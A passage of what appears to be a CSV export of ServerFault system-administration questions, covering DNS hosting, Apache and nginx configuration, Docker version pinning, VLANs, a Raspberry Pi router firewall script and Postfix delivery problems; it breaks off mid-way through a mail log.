"867782","Why do website host handles dns to resolve services(mail.domain.com ftp etc) instead of the domain registry?","<p>I have bought a new hosting service, and needed to change the name servers pointing to the new host for my website. When I did , all other subdomains especially ftp, mail subdomain and mx record broke.</p>

<p>I was told I have set up the dns resolution again in my host cpanel to fix this. So I wonder why cant it be set up in the domain registry? Why not point the website to the host which have all my files, and the rest leave as it is?</p>

<p>My suspicion is, correct me if Im wrong. That in able to find the domain.com IP, it needs go through the domain ""."" root then ""com"" top level and finally my domain. Once it finds where its sitting, it resolve the rest of names like @, then mail subdomain , ftp etc.But since it doesnt have any record to where to find it , it just stops. The thing is why cant it just go back to the domain registry to find the other info?</p>

<p>Please do let me know If Im understanding this all wrong.</p>

<p>PS: Current situation is I have a website in a cloud server on rackspace, our website points to that site and mails, ftp etc points to other server. So if this works why do I have to change the dns records in my hosting too. Really confused.</p>
","<dns-zone><dns-hosting>","2017-08-09 18:24:37"
"946544","Why do players in EU get a higher ping when connecting to a Chinese server during their daytime as opposed to their nighttime?","<p>Apologies if this is wrong place for this. I was directed to this board as it's a server issue.</p>

<p>There's a server that I play on freqeuently that is in China; I live in Europe and understandably have a higher ping in general. However I have noticed that during the night when nobody is playing I have a lower ping than during the day where I have a higher ping. (250 ping during the day and 200 during the night)</p>

<p>The question/s:</p>

<p>What causes this specifically? Is this simply down to more players putting more load onto the hardware thus causing the network to become more strained or is there something more to it than that?</p>

<p>Please close this down if it is not relevant to this board, I'm not sure whether this is the right place or not personally. </p>
","<ping><lag>","2018-12-25 02:34:05"
"776004","Email for domain vs subdomain at two different locations","<p>I would like to know if I have a domain foo.bar and want to host the main email server at other provider, such as by google, simultaneously having another email server subdomain.foo.bar locally. </p>

<p>In other words, emails to user@foo.bar will be handled by external host while emails to user@subdomain.foo.bar will be handled by a local email server. Both cater to global clients.</p>

<p>Is it a usual practice to do so?</p>
","<email><subdomain><host>","2016-05-11 02:42:16"
"946633","How to tell my apache server running in a docker container to write logs to stdout","<p>I have been trying to point my logs to /proc/1/fd/1 but it is saying cannot acces the directory and if i use /proc/self/fd/1 nothing is writing to my stdout</p>
","<ubuntu-14.04>","2018-12-26 08:48:22"
"988354","nginx link domain's subdirectory with subdomain","<ul>
<li>example.com</li>
<li>sub.example.com</li>
</ul>

<p>When I access example.com/sub, I want to redirect sub.example.com, while browser address still remains example.com/sub</p>

<p>Is it possible?</p>
","<nginx>","2019-10-17 08:14:58"
"868022","df -h says / fs is taking 61G of space but its not","<p>df -h in my redhat 7 is reporting its taking 61G of space. This should be wrong because there shouldn't be anything there which is this big. Other server with the same configuration reports only 11G.</p>

<p><a href=""https://i.sstatic.net/xxz4A.png"" rel=""nofollow noreferrer"">Output of df -h:</a></p>

<p><a href=""https://i.sstatic.net/SP1bR.png"" rel=""nofollow noreferrer"">Output of du -sh /*</a></p>

<p>Maximum space is consumed by /var and thats only 11g. I checked all the files and directories inside /var but couldn't find anything big. </p>

<p>Please Advise,</p>
","<linux><redhat><ext4><rhel7><df>","2017-08-10 17:59:36"
"946733","phpmyadmin database getting deleted automatically","<p>I am using aws ec2 t2 instance. Where I created few database as per my requirement. </p>

<p>For last few day I noticed new databases which I create getting deleted automatically. Is there any possibility of automatically getting deleted?</p>

<p>Current I have not put any password on phpmyadmin. Also no one other then me knowing IP of this server. </p>

<p>Any clue why it is getting deleted and tips to secure it?</p>
","<mysql><amazon-ec2><phpmyadmin>","2018-12-27 06:55:12"
"868082","Nginx codeigniter setup","<p>I'm trying to set up Nginx to serve CodeIgniter as per the official docs: <a href=""https://www.nginx.com/resources/wiki/start/topics/recipes/codeigniter"" rel=""nofollow noreferrer"">https://www.nginx.com/resources/wiki/start/topics/recipes/codeigniter</a>. The problem is, I have no clue what the directive <code>fastcgi_pass 127.0.0.1:9000</code> is supposed to do. I mean, there's nothing running on port 9000 on my machine (or is there? How can I be sure?). How do I set this up?</p>
","<nginx><codeigniter>","2017-08-11 05:13:43"
"868149","Apache takes me to same site with different domains","<p>When I try to navigate to my site any domain I enter under https it takes me to the site specified in the VirtualHost config provided. I have setup the ServerName but it still doesn't work. So if I enter <a href=""https://storage.example.com/"" rel=""nofollow noreferrer"">https://storage.example.com/</a> it takes me to the site as expected but when I enter anything else such as <a href=""https://ab.example.com/"" rel=""nofollow noreferrer"">https://ab.example.com/</a> it still takes me to the previous site. Why does this happen?</p>

<pre><code>&lt;VirtualHost *:80&gt;
        ServerName storage.example.com
        #Redirect permanent / https://storage.example.com/
        RewriteCond %{HTTP_HOST} ^storage.example.com
        RewriteRule ^(.*)$ https://storage.example.com$1 [R,L]
&lt;/VirtualHost&gt;

&lt;VirtualHost *:443&gt;
        Alias /files /var/www/files
        ServerName storage.example.com
        DocumentRoot /var/www/nextcloud/

        &lt;Directory /var/www/nextcloud/&gt;
                Options +FollowSymlinks
                AllowOverride All

                &lt;IfModule mod_dav.c&gt;
                        Dav off
                &lt;/IfModule&gt;

                SetEnv HOME /var/www/nextcloud
                SetEnv HTTP_HOME /var/www/nextcloud
        &lt;/Directory&gt;

        # SSL
        SSLEngine on
        SSLCertificateFile      /etc/letsencrypt/live/storage.example.com/cert.pem
        SSLCertificateKeyFile /etc/letsencrypt/live/storage.example.com/privkey.pem
        SSLCertificateChainFile /etc/letsencrypt/live/storage.example.com/fullchain.pem

        Header always set Strict-Transport-Security ""max-age=63072000; includeSubdomains;""

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

&lt;/VirtualHost&gt;
</code></pre>
","<apache-2.4><virtualhost><https>","2017-08-11 11:49:41"
"988502","I deleted a page on website but it's still showing up 24 hours later","<p>Yesterday as I was uploading changes to a website that I'm working on the server stopped showing the changed files. After making several changes to the file and repeatedly uploading it to no avail, I deleted the file on the server. Hoping that it would now show a 404 error when I cleared the cache in my browser and refreshed the page, I was sorely disappointed.</p>

<p>Does anyone have any suggestions on things to try? It is an A2 Hosting reseller account.</p>
","<web-server><cache>","2019-10-18 03:55:44"
"988511","How to extract the text inside a block in an HCL (HashiCorp Configuration Language) file using Bash?","<p>I have a HashiCorp Configuration Language (HCL) file with this block.</p>

<pre><code>database = {
    gdb_name            =   ""XXXXX""
    sid_name            =   ""XXXXX""
    createContainerDB   =   ""True""
    numberOfPDBs        =   ""1""
    pdb_name            =   ""XXXXX""
    oracle_database_sid =   ""XXXXX""
}
</code></pre>

<p>I need only the below text from it &amp; assign the individual lines to different shell variables.</p>

<pre><code>gdb_name
sid_name
createContainerDB
numberOfPDBs
pdb_name
oracle_database_sid
</code></pre>

<p>But the catch here is that the text within <code>database = {}</code> might change. So, I need to extract the text within <code>database = {}</code> dynamically &amp; then assign it to variables.</p>

<p>How can I achieve this using Bash?</p>
","<bash><shell>","2019-10-18 06:58:04"
"776294","Moving Data to Amazon EC2","<p>I've got an <em>Amazon EC2</em> instance running and I'm trying to move files from another web server to the <em>EC2</em>.</p>

<p>I'm using <strong>wget</strong> on the <em>EC2</em> to fetch and <strong>30GB Zip file</strong>. It's running at 100KB/s to 150KB/s on the EC2. It's expected to finish in 2 days 10 hours.</p>

<p>Is there a faster way to upload files of this size to EC2? Does Amazon have a Server that would make this easier?</p>

<p>I Googled this one and went to the Amazon's page, all I could fine are tools/services to upload files to S3 and Amazon Snowbowl which I think is too big of a solution of just 30GB.</p>

<p>Thanks!</p>
","<amazon-ec2><amazon-web-services>","2016-05-12 07:30:04"
"988558","Kubernetes requires Docker 18.09 but CentOS yum upgrades it to 19.03","<p>Kubernetes seem to require docker version <code>18.09</code> even if newer versions exist such as <code>19.03</code>...</p>

<p>When installing on <code>CentOS</code>, I made sure to pass the right version to yum.</p>

<p>Unfortunately, I did a <code>yum update</code> / <code>yum upgrade</code> after and it upgraded docker's version to the newest...</p>

<p>In Kubernetes documentation, it is specifically written to use 18.09, and I also get some warnings after issuing the <code>kubeadm init</code> command.</p>

<p>2 questions here...</p>

<ul>
<li>Why is still the newest K8s version not supporting <code>19.03</code>?</li>
<li>How can I make sure CentOS doesn't update <code>18.09</code>?</li>
</ul>

<p>Thank you very much!</p>
","<centos><kubernetes>","2019-10-18 13:35:11"
"988569","Can't access phpmyadmin, because of a faulty DNS entry","<p>I've crashed my domain's DNS trying to enter a DKIM entry to my control panel, now I can't access my domain, my control panel or PHPMyAdmin because they all reside on my domain.</p>

<p>Is there a way I can edit a DB entry from FTP, or I can take out the DKIM entry? because it seems like that is the only way I can access my server files.</p>

<p>Any help is much appreciated.</p>
","<domain-name-system><mysql><phpmyadmin>","2019-10-18 15:19:08"
"946865","Configure subdomain to point to AWS S3","<p>I have a domain www.test.com which points to a website which was created using WIX. Hence, the nameserver in my www.test.com (GoDaddy is the registrar, so I can edit my nameserver at <a href=""https://dcc.godaddy.com"" rel=""nofollow noreferrer"">https://dcc.godaddy.com</a>) domain points to </p>

<pre><code>ns7.wixdns.net
ns8.wixdns.net
</code></pre>

<p>Now I want to have admin.test.com to point to my S3 bucket <code>http://admin.test.com.s3-website-ap-southeast-1.amazonaws.com/Login</code></p>

<p>I have set my S3 bucket Properties > Static Website Hosting > Redirect Requests to <code>admin.test.com</code> and add alias record in Route 53 as suggested by <a href=""https://docs.aws.amazon.com/AmazonS3/latest/dev/website-hosting-custom-domain-walkthrough.html#root-domain-walkthrough-add-arecord-to-hostedzone"" rel=""nofollow noreferrer"">this Amazon Docs</a> </p>

<p>Now I'm pretty sure I need to point my domain's nameserver to this Route 53, but I'm confused what and/or where I should do it. If I change the nameserver in <a href=""https://dcc.godaddy.com"" rel=""nofollow noreferrer"">https://dcc.godaddy.com</a> to something else, pretty sure my wix hosted website will be inaccessible.</p>
","<amazon-s3>","2018-12-28 10:33:45"
"776331","How to calculate highest CCU (concurrent users) in server linux?","<p>I used Jmeter to test stress of my application, i can check information of server RAM, CPU while testing.
Base on the information, how can i calculate value of highest CCU (concurrent users) while the server can run well.</p>
","<linux><jmeter>","2016-05-12 10:26:40"
"776337","Setting Up and Managing Thin Client","<p>I have taken delivery of fairly used HP thin clients with model no t5730w.</p>

<p>I am trying to use it set up a computer laboratory for a school in a remote part of Ghana, Africa that I volunteered for.</p>

<p>I am able to connect one device to the host/server I have set up but anytime I connect it via RDP, the Host will have to be locked.</p>

<p>Meanwhile I assumed I will have to create multiple user account on the Host and connect one thin-client to one account. But if the first device locks the host how am I able to connect the rest?</p>

<p>Is there a straight forward way to have this set up and also not lock the terminals?</p>

<p>Is there any form of management software (probably free because I am funding everything out of my own pocket) to make this easy since i will be leaving and have to train someone to manage the set up once I'm not around.</p>

<p>I am fairly familiar with networking and computers but haven't worked with thin-clients before. Honestly the cost of setting this up might have not be that much different from fat-client but I'm concerned about the electricity bills they will have to incur subsequently.</p>

<p>Any help will be appreciated.</p>

<p>thanks,
Max</p>
","<thin-client>","2016-05-12 11:06:34"
"868260","Whats better: stress test the entire system vs profiling and stress testing specific parts?","<p>I work in a company that is entirely on the cloud and we have started a stress testing project. The idea is to load everything in production to a new environment and run stress tests on it to find the total capacity of the system and where the bottlenecks are. </p>

<p>Now, I remember a time when we stress tests physical servers as well as private clouds and I remember that it was almost impossible to get a complete copy of production and all its moving parts. Also, even with stress testing tools like sysbench, Jmeter and ab, you never could exactly simulate traffic just like production. </p>

<p>We would usually monitor and profile production as much as we could, identify an issue and then try to fix that specific issue by simulating it in the stress testing environment.</p>

<p>To calculate capacity we used to (and some still do) use a calculation to predict when capacity will be met or if the response time is below satisfactory levels.</p>

<p>Considering that the project to recreate production and stress test it is quite time and resource consuming, is this the best way to go to find bottlenecks in the system and measure capacity, or is the ""old"" way better?</p>
","<stress-testing>","2017-08-11 21:19:25"
"947004","Recover filesystem after resize FAT32","<p>I recently resized one partition inside an LVM on my disk using <code>gparted</code>. No errors were given, but now the filesystem is corrupted and I'm trying to recover it.</p>

<p>When I mount it, no errors appear but when I <code>ls</code> into the mount point I have a directory full of files/directories with broken attributes that give input/output error. To be more explicit, all files have a random name except for one detail, a dot always in the same position. For example, these are two of the file names: <code>?enOxfJl.mul</code>, <code>FMgUIKEJ.ahg</code>.</p>

<p>I suspect there's some ""shift"" in the filesystem, also because one of the files is named <code>-----BEG.IN</code>, that looks exactly like the beginning of a PGP message, and I actually have some of them in that partition.</p>

<p>I already used PhotoRec to recover readable files and it seems that nothing is really lost, I recovered quite everything but that software cannot restore also the directory tree.</p>

<p>I wonder if there are some kind of tricky mount options to read again the filesystem without recreating it, or simply some software to repair that broken fs. I already tried TestDisk, but it seems more appropriate for restoring broken partition tables than filesystems</p>
","<filesystems><gparted><fat32>","2018-12-29 18:49:16"
"988750","D-Link DES-1210/28P VLAN Configuration","<p>Hi i have the below requirement to be configured on DES-1210-28P</p>

<p>Create  4 VLANS</p>

<p>VLAN 296
VLAN 2910
VLAN 101
VLAN 102</p>

<p>Configure VLANS</p>

<ol>
<li>Port 24 Trunk-Port to allow VLAN 296 &amp; 2910 </li>
<li>Port 23 Trunk-Port to allow VLAN 101 &amp; 102  </li>
<li>Port 22 Access-Port to allow VLAN 296   </li>
<li>Port 21 Access-Port to allow VLAN 101   </li>
<li>Port 20 Access-Port to allow VLAN 2910  </li>
<li>Port 19 Access-Port to allow VLAN 102</li>
</ol>

<p>Is it possible to do the above configuration in this model?</p>
","<vlan><trunk>","2019-10-20 15:57:00"
"988756","I can't understand why","<p>I have a raspberry pi 3 b+ with Raspbian Buster (10) and I am trying to build a router. I have setup the flowing programs:</p>

<ul>
<li>bind9 for local dns resolution </li>
<li>hostapd for wifi hotspot</li>
<li>bridge-utils to bridge several USB RJ45 network adapters</li>
<li>isc-dhcp-server for DHCP</li>
</ul>

<p>Everything works except some sites like <a href=""https://www.blizzard.com/"" rel=""nofollow noreferrer"">https://www.blizzard.com/</a> and <a href=""https://elinux.org/RPi_VerifiedPeripherals"" rel=""nofollow noreferrer"">https://elinux.org/RPi_VerifiedPeripherals</a> dose not work on the LAN computer it does work with wget on tge raspberry terminal.</p>

<pre><code>dig elinux.org

; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Raspbian &lt;&lt;&gt;&gt; elinux.org
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 13532
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 83ac21300a7256c9547d18865dac8a7c05e503c74f8a2539 (good)
;; QUESTION SECTION:
;elinux.org.                    IN      A

;; ANSWER SECTION:
elinux.org.             288     IN      A       140.211.9.40

;; Query time: 5 msec
;; SERVER: 193.231.252.1#53(193.231.252.1)
;; WHEN: Sun Oct 20 17:25:32 BST 2019
;; MSG SIZE  rcvd: 83
</code></pre>

<pre><code>ping elinux.org
PING elinux.org (140.211.9.40) 56(84) bytes of data.
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=1 ttl=46 time=204 ms
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=2 ttl=46 time=234 ms
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=3 ttl=46 time=203 ms
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=4 ttl=46 time=203 ms
^C
--- elinux.org ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 6ms
rtt min/avg/max/mdev = 203.260/211.043/234.063/13.298 ms
</code></pre>

<pre><code>ping elinux.org
PING elinux.org (140.211.9.40) 56(84) bytes of data.
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=1 ttl=46 time=204 ms
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=2 ttl=46 time=234 ms
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=3 ttl=46 time=203 ms
64 bytes from web3.osuosl.org (140.211.9.40): icmp_seq=4 ttl=46 time=203 ms
^C
--- elinux.org ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 6ms
rtt min/avg/max/mdev = 203.260/211.043/234.063/13.298 ms
root@raspberrypi ~ # traceroute elinux.org
traceroute to elinux.org (140.211.9.40), 30 hops max, 60 byte packets
 1  10.0.0.1 (10.0.0.1)  1.565 ms  1.224 ms  1.262 ms
 2  10.225.82.129 (10.225.82.129)  1.930 ms  1.918 ms  1.963 ms
 3  static-10-220-142-133.rdsnet.ro (10.220.142.133)  5.718 ms static-10-220-142-135.rdsnet.ro (10.220.142.135)                                                      5.515 ms static-10-220-142-131.rdsnet.ro (10.220.142.131)  5.406 ms
 4  buca-b1-link.telia.net (62.115.165.184)  48.952 ms  48.961 ms  48.858 ms
 5  win-bb2-link.telia.net (62.115.119.116)  39.329 ms  38.954 ms  39.079 ms
 6  prag-b3-link.telia.net (62.115.137.41)  39.599 ms prag-b3-link.telia.net (62.115.136.219)  43.260 ms prag-b3-                                                    link.telia.net (62.115.137.41)  39.919 ms
 7  be1299.ccr21.prg01.atlas.cogentco.com (130.117.14.217)  36.927 ms  37.006 ms  40.529 ms
 8  be3029.ccr42.ham01.atlas.cogentco.com (154.54.59.61)  44.963 ms be3027.ccr41.ham01.atlas.cogentco.com (130.11                                                    7.1.205)  48.916 ms  44.906 ms
 9  be2816.ccr42.ams03.atlas.cogentco.com (154.54.38.209)  49.500 ms  49.530 ms be2815.ccr41.ams03.atlas.cogentco                                                    .com (154.54.38.205)  46.480 ms
10  be2183.ccr22.lpl01.atlas.cogentco.com (154.54.58.69)  150.451 ms be2182.ccr21.lpl01.atlas.cogentco.com (154.5                                                    4.77.246)  145.172 ms  141.699 ms
11  be3042.ccr21.ymq01.atlas.cogentco.com (154.54.44.162)  201.322 ms be3043.ccr22.ymq01.atlas.cogentco.com (154.                                                    54.44.166)  143.314 ms  140.090 ms
12  be2088.ccr21.alb02.atlas.cogentco.com (154.54.43.18)  149.432 ms  149.643 ms be3260.ccr32.yyz02.atlas.cogentc                                                    o.com (154.54.42.89)  144.251 ms
13  be2878.ccr21.cle04.atlas.cogentco.com (154.54.26.129)  141.580 ms be2994.ccr22.cle04.atlas.cogentco.com (154.                                                    54.31.233)  149.237 ms be2879.ccr22.cle04.atlas.cogentco.com (154.54.29.173)  143.909 ms
14  be2717.ccr41.ord01.atlas.cogentco.com (154.54.6.221)  144.485 ms be2718.ccr42.ord01.atlas.cogentco.com (154.5                                                    4.7.129)  140.289 ms  141.324 ms
15  be2832.ccr22.mci01.atlas.cogentco.com (154.54.44.169)  168.942 ms be2831.ccr21.mci01.atlas.cogentco.com (154.                                                    54.42.165)  161.018 ms be2832.ccr22.mci01.atlas.cogentco.com (154.54.44.169)  160.662 ms
16  be3035.ccr21.den01.atlas.cogentco.com (154.54.5.89)  177.900 ms  175.603 ms  177.563 ms
17  be3037.ccr21.slc01.atlas.cogentco.com (154.54.41.145)  200.108 ms be3038.ccr32.slc01.atlas.cogentco.com (154.                                                    54.42.97)  187.487 ms  192.694 ms
18  be2029.ccr22.sea02.atlas.cogentco.com (154.54.86.110)  193.006 ms 154.54.89.101 (154.54.89.101)  196.937 ms                                                      195.776 ms
19  be2670.ccr21.pdx01.atlas.cogentco.com (154.54.42.150)  198.230 ms be2671.ccr21.pdx01.atlas.cogentco.com (154.                                                    54.31.78)  200.333 ms be2670.ccr21.pdx01.atlas.cogentco.com (154.54.42.150)  198.074 ms
20  cogent-pdx.nero.net (38.142.108.50)  199.346 ms  202.199 ms  202.046 ms
21  ptck-p2-gw.nero.net (207.98.64.170)  194.704 ms ptck-p1-gw.nero.net (207.98.64.168)  191.265 ms ptck-p2-gw.ne                                                    ro.net (207.98.64.170)  194.576 ms
22  corv-p1-gw.nero.net (207.98.64.25)  199.337 ms corv-p2-gw.nero.net (207.98.64.27)  198.806 ms  201.314 ms
23  corv-car1-gw.nero.net (207.98.64.17)  205.363 ms corv-car1-gw.nero.net (207.98.64.19)  211.461 ms  202.935 ms
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *
</code></pre>

<p>Windows 10:</p>

<pre><code>C:\Users\xx&gt;ping elinux.org

Pinging elinux.org [140.211.9.40] with 32 bytes of data:
Reply from 140.211.9.40: bytes=32 time=203ms TTL=45
Reply from 140.211.9.40: bytes=32 time=203ms TTL=45
Reply from 140.211.9.40: bytes=32 time=203ms TTL=45
Reply from 140.211.9.40: bytes=32 time=203ms TTL=45
</code></pre>

<pre><code>
C:\Users\IcyTeck&gt;tracert elinux.org

Tracing route to elinux.org [140.211.9.40]
over a maximum of 30 hops:

  1     1 ms    &lt;1 ms     1 ms  192.168.1.1
  2     1 ms     1 ms     1 ms  10.0.0.1
  3     2 ms     2 ms     2 ms  10.225.82.129
  4    49 ms    72 ms    55 ms  10.220.142.133
  5    40 ms    40 ms    40 ms  buca-b1-link.telia.net [62.115.165.184]
  6    37 ms    36 ms    36 ms  prag-bb1-link.telia.net [62.115.119.122]
  7    42 ms    42 ms    42 ms  prag-b3-link.telia.net [62.115.136.219]
  8    39 ms    37 ms    37 ms  be1299.ccr21.prg01.atlas.cogentco.com [130.117.14.217]
  9    45 ms    45 ms    45 ms  be3029.ccr42.ham01.atlas.cogentco.com [154.54.59.61]
 10    46 ms    46 ms    46 ms  be2816.ccr42.ams03.atlas.cogentco.com [154.54.38.209]
 11   147 ms   147 ms   147 ms  be2183.ccr22.lpl01.atlas.cogentco.com [154.54.58.69]
 12   147 ms   144 ms   142 ms  be3043.ccr22.ymq01.atlas.cogentco.com [154.54.44.166]
 13   141 ms   141 ms   142 ms  be3260.ccr32.yyz02.atlas.cogentco.com [154.54.42.89]
 14   146 ms   146 ms   146 ms  be2994.ccr22.cle04.atlas.cogentco.com [154.54.31.233]
 15   146 ms   146 ms   146 ms  be2718.ccr42.ord01.atlas.cogentco.com [154.54.7.129]
 16   172 ms   166 ms   166 ms  be2832.ccr22.mci01.atlas.cogentco.com [154.54.44.169]
 17   186 ms   180 ms   179 ms  be3036.ccr22.den01.atlas.cogentco.com [154.54.31.89]
 18   194 ms   194 ms   194 ms  be3038.ccr32.slc01.atlas.cogentco.com [154.54.42.97]
 19   194 ms   194 ms   194 ms  154.54.89.101
 20   197 ms   197 ms   197 ms  be2671.ccr21.pdx01.atlas.cogentco.com [154.54.31.78]
 21   199 ms   199 ms   199 ms  cogent-pdx.nero.net [38.142.108.50]
 22   192 ms   193 ms   193 ms  ptck-p1-gw.nero.net [207.98.64.168]
 23   209 ms   204 ms   209 ms  corv-p1-gw.nero.net [207.98.64.25]
 24   213 ms   209 ms   209 ms  corv-car1-gw.nero.net [207.98.64.19]
 25   203 ms   203 ms   203 ms  web3.osuosl.org [140.211.9.40]
</code></pre>

<p>Any idea?</p>

<p>Thank you so much in advance and have a great weekend!</p>

<p>PS: this is my firewall script</p>

<pre><code>#!/bin/bash
echo ""Setting sysctl ...""
/sbin/sysctl net.ipv4.ip_forward=1
/sbin/sysctl net.ipv6.conf.default.forwarding=1
/sbin/sysctl net.ipv6.conf.all.forwarding=1
/sbin/sysctl -p
echo ""Cleanig ...""
#Flash IPTABLES
iptables -F 
iptables -t nat -F
iptables -t mangle -F
iptables -X
echo ""Creating ...""
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -i ppp0 -j ACCEPT
iptables -A INPUT -s 8x.1x.x.248 -j ACCEPT
iptables -A INPUT -s 8x.1x.x.0 -j ACCEPT
iptables -A INPUT -s 8x.1x.x.6 -j ACCEPT
iptables -A INPUT -s 8x.1x.x.21 -j ACCEPT
iptables -A INPUT -s 8x.1x.x.36 -j ACCEPT
iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT
iptables -A FORWARD -p icmp --icmp-type echo-reply -j ACCEPT

iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE

iptables -A INPUT -m iprange --src-range 192.168.0.0-192.168.0.255 -j ACCEPT
iptables -A INPUT -m iprange --src-range 192.168.1.0-192.168.1.255 -j ACCEPT
iptables -A FORWARD -j ACCEPT
iptables -A OUTPUT -j ACCEPT
#iptables -A nat -j ACCEPT

iptables -A INPUT -j LOG --log-prefix ""INPUT:DROP:"" --log-level 4
iptables -A OUTPUT -j LOG --log-prefix ""OUTPUT:DROP:"" --log-level 4
iptables -A FORWARD -j LOG --log-prefix ""FORWARD:DROP:"" --log-level 4
iptables -A nat -j LOG --log-prefix ""nat:DROP:"" --log-level 4

iptables -A INPUT -j DROP
echo ""Droping ...:""
#iptables -I INPUT -s 95.90.x.x -j DRO

echo ""Sysctl rules:""
/sbin/sysctl -p
echo ""Iptables rules:""
iptables -v -L -n 
</code></pre>
","<linux-networking><raspbian><bridge-router>","2019-10-20 17:41:01"
"868374","What is the purpose of the -Hu argument for sudo?","<p>I've seen several sudo commands that begin as so:</p>

<pre><code>sudo -Hu apache
</code></pre>

<p>What is the purpose of the -Hu argument, and how does it pertain to the <code>apache</code> command that follows?</p>
","<apache-2.2><sudo>","2017-08-13 03:27:47"
"776516","Apache Options missing Plus/Minus sign","<p>I have to migrate an Apache web server from version 2.2 to version 2.4. In Apache 2.2, I find the following Options directive in the virtual host configuration files:</p>

<pre><code>Options -Indexes FollowSymLinks
</code></pre>

<p>Now, that this syntax is invalid in 2.4</p>

<pre><code>Either all Options must start with + or -, or no Option may
</code></pre>

<p>I wonder what the previous syntax is equivalent with. Do I have to prepend a <code>+</code> or a <code>-</code> to <code>FollowSymLinks</code>?</p>
","<apache-2.2><apache-2.4><options>","2016-05-13 07:00:41"
"868413","Correct CNAME Administration","<p>first time posting here!</p>

<p>So usually I do not have any issues resolving problems or questions due to the huge collection of KB articles and forum posts.</p>

<p>However, either I am totally misunderstanding something or what I am trying to accomplish it simply not possible.</p>

<p>I want to setup autoconfig and autodiscovery for my hosting clients. So far I managed to get autoconfig working via autoconfig.skylayer.eu. This means when someone enters any email address associated with skylayer.eu into Thunderbird, the connection settings are being filled out correctly. I achieved this following several tutorials from which I pieced together bits and pieces.</p>

<p>Now I would like to have every domain hosting on my plesk instance to call upon <a href=""http://autoconfig.skylayer.eu/mail/config-v1.1.xml"" rel=""nofollow noreferrer"">http://autoconfig.skylayer.eu/mail/config-v1.1.xml</a></p>

<p>As far as I understood this is achievable by entering a CNAME record, e.g. autoconfig.slyman.eu. However, when visiting autoconfig.slyman.eu one is redirected to skylayer.eu and I can't figure out why. Obviously Thunderbird is then unable to get the correct file.</p>

<p>I also tried to test a different CNAME: webmail.sebastian-tschamler.de which is supposed to go webmail.skylayer.eu but also redirects to skylayer.eu.</p>

<p>So I believe I am doing something entirely wrong but can't figure out what.</p>

<p>What am I missing? Any hint into the right direction is greatly appreciated. If you need any more info please do ask.</p>

<p>Thanks,
Daniel</p>
","<domain-name-system><cname-record><plesk>","2017-08-13 11:20:07"
"868448","Use Active Directory on a host computer and not only on the server?","<p>I want to have Active directory on my own PC and not only remotely 
connect to the server every time I want to change something in the Active Directory. How can I achieve that?</p>

<p>Thank you in advance.</p>
","<active-directory>","2017-08-13 19:08:01"
"988926","what is the recommended RAID level for applications by MegaRAID 9261-8i","<p>I wanna to know which RAID level is good to set for database usage, webservers and so on when I use MegaRAID SAS 9261-8i or 9263-8i..</p>

<p>I will glad if help me.</p>
","<raid><megaraid>","2019-10-22 06:06:38"
"947314","What type of fiber patch cable to buy of OM4","<p>I have a fiber patch panel with the installed fibers 50/125 OM4.
I have bought an OM2: FO patch cord, duplex, LC to LC MM OM2 50/125 µ, 1 m Length 1m</p>

<p>cable which works between 2 switches but not through the fiber in the wall. The diameters of the fiber are the same in OM2 and OM4. When I link the 2 switches together with the cable I bought they work fine, not with the patch panel. </p>

<p>Is OM4 for single mode fiber only?</p>
","<fiber>","2019-01-02 11:48:59"
"868519","Postfix can receive but can't send external","<p>I recently installed ispconfig 3 from this manual: <a href=""https://www.howtoforge.com/tutorial...-9-stretch-apache-bind-dovecot-ispconfig-3-1/"" rel=""nofollow noreferrer"">https://www.howtoforge.com/tutorial...-9-stretch-apache-bind-dovecot-ispconfig-3-1/</a>
But now the problem is; I can receive mail from external clients but I can't send mail to external clents.
I used gmail and my old hotmail account but neither of those is receiving.
I also checked if my server is block by a spam filter, but even that wasn't the case.
My mail.log:</p>

<pre><code>Aug 13 11:08:03 server1 dovecot: imap(admin@dkict.com): Logged out in=44 out=592
Aug 13 11:08:18 server1 postfix/qmgr[6091]: 5E5DE4625BF: from=&lt;&gt;, size=5323, nrcpt=1 (queue active)
Aug 13 11:08:18 server1 postfix/qmgr[6091]: 034B9460D91: from=&lt;&gt;, size=4949, nrcpt=1 (queue active)
Aug 13 11:08:18 server1 postfix/qmgr[6091]: CE59B4625CE: from=&lt;test@dkict.com&gt;, size=909, nrcpt=1 (queue active)
Aug 13 11:08:25 server1 postfix/smtpd[9261]: connect from localhost[::1]
Aug 13 11:08:25 server1 postfix/smtpd[9261]: warning: table ""mysql:/etc/postfix/mysql-virtual_client.cf"": empty query string -- ignored
Aug 13 11:08:25 server1 postfix/smtpd[9261]: NOQUEUE: filter: RCPT from localhost[::1]: &lt;admin@dkict.com&gt;: Sender address triggers FILTER amavis:[12$
Aug 13 11:08:25 server1 postfix/smtpd[9261]: 7D8B246021F: client=localhost[::1]
Aug 13 11:08:25 server1 postfix/cleanup[9262]: 7D8B246021F: message-id=&lt;8d024ea696db4366e8d63e9f629bc680@dkict.com&gt;
Aug 13 11:08:25 server1 postfix/qmgr[6091]: 7D8B246021F: from=&lt;admin@dkict.com&gt;, size=575, nrcpt=1 (queue active)
Aug 13 11:08:25 server1 dovecot: imap-login: Login: user=&lt;admin@dkict.com&gt;, method=PLAIN, rip=::1, lip=::1, mpid=9265, secured, session=&lt;4BKH455WpuI$
